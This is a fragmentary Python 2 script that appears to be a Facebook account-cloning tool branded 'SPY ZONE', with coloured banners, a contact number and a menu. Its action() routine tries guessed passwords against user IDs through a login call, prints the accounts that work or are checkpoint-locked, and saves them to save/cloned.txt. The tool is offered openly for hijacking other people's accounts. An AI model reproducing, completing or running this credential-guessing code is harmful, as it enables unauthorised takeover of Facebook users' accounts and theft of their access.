...
\033[1;97m\x1b[1;96m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
\033[1;91m\x1b[1;91mmSPY-ZONE LOVER
                    
\033[1;94m\x1b[1;94mFACEBOOK SPY ZONE
                    
\033[1;91m\x1b[1;95mWhatsap Number +92*********9
                     
\x1b[1;94mSPY ZONE -LOVER
     \x1b[1;93m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
\033[1;96m.\x1b[1;92mKING OF SPY.
\033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••                
\033[1;92m-\x1b[1;94mKING OF SPY-ZONE LOVER--------------------------------------
"""
...
────────▀█▀
\033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
\033[1;96m-\x1b[1;93mThe Credit For This Code Goes SPY ZONE..
\033[1;97m
...
\033[1;94mFACEBOOK-\x1b[1;94mSPY ZONE
                  
                     
\033[1;92mWHATAAPP \x1b[1;93m+92*********9
                      
\033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
\033[1;96m -\x1b[1;92mking OF SPY ZONE-BANGLADESH
\033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
                                                
\033[1;97m----------------------\x1b[1;96mSPY ZONE Hackers BANGLADESH--------------------
"""
CorrectUsername = "SPY"
...
def Zeek():
    ...
    time.sleep(0.10)
    print '\x1b[1;92m[2] SPY-ZONE'
    time.sleep(0.10)
    print '\x1b[1;93m[3] SPY-ZONE LOVER'
    time.sleep(0.10)
    print '\x1b[1;93m[4] SPY-ZONE'
    time.sleep(0.10)
    print '\x1b[1;92m[5] CLONING ERROR'
    time.sleep(0.10)
    print '\x1b[1;91m[6] SPY ZONE FACEBOOK'
    time.sleep(0.10)
...
def action():
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;97m(\x1b[1;95mSPY-ZONE LOVERS) ' + k + c + user + '  |  ' + pass1
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;91m(Lock)  ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;97m(\x1b[1;93mSPY-CP) ' + k + c + user + '  |  ' + pass2
                            cps = open('save/cloned.txt', 'a')
    ...
    jalan("Note : Your Offline account Will Open after 07 to 10 days")
    print ''
    print """
    ███
──────────███║║║║║║║███
...
──────────────────────▀▀▀████
──────────────────────▄█████▀
\033[1;96mFOLLOW ON FACEBOOK
\033[1;95mFb\033[1;97mSPY ZONE
\033[1;95m033[1;97m"""
